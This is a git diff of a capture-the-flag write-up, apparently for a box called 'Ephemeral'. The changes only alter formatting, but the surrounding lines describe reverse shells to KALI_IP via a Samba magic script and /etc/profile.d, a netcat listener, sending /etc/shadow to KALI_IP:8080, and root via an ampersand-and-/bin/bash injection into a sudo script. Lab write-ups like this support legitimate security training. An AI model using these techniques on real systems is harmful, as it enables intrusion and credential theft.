@@ -191,7 +191,7 @@ magic script = smbscript.elf
 guest ok = no
 ```
 
-
+\
 In KALI, Create a bash script file named `smbscript.elf` containing the following reverse shell command (replace KALI_IP):
 
 ```shell
@@ -253,7 +253,7 @@ PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 * * * * *	ralph	/home/ralph/tools/ssh.sh
 ```
 
-
+\
 View the contents of the cron script to see that the user ralph is logging into the local system every minute when the cron job runs:
 
 ```shell
@@ -304,7 +304,7 @@ On your KALI machine use netcat to accept reverse shell
 listening on [any] 9999 ...
 ```
 
-
+\
 Create another reverse shell script in `/etc/profile.d` folder and wait for the cronjob to work (replace KALI_IP)
 
 ```shell
@@ -438,7 +438,7 @@ File Path: /etc/shadow
 IP Address: KALI_IP:8080
 ```
 
-{{< bs/alert quote >}} {{< markdownify >}} This creates a file on the victim machine called `index.html` confirming the file upload (for some reason the file doesn't actually upload, however it shows the contents of what's supposed to be uploaded).
+{{< bs/alert warning >}} {{< markdownify >}} This creates a file on the victim machine called `index.html` confirming the file upload (for some reason the file doesn't actually upload, however it shows the contents of what's supposed to be uploaded).
 {{< /markdownify>}} {{< /bs/alert >}}
 
 ```shell
@@ -449,8 +449,8 @@ ralph@ephemeral:~$ cat index.html
 {{< bs/alert info >}} {{< markdownify >}}Attempted to crack the root user password using rockyou.txt but did not have any luck...
 {{< /bs/alert >}} {{< /markdownify >}}
 
-\
-After more tampering, we discovered that you can send additional command line switches to after the IP address prompt in the script; this led us to try adding an ampersand and /bin/bash after the IP to receive a root shell:
+{{< bs/alert dark >}}After more tampering, we discovered that you can send additional command line switches to after the IP address prompt in the script; this led us to try adding an ampersand and /bin/bash after the IP to receive a root shell:
+{{< /bs/alert>}}
 
 ```shell
 ralph@ephemeral:~$ sudo /usr/bin/python3 /home/ralph/getfile.py
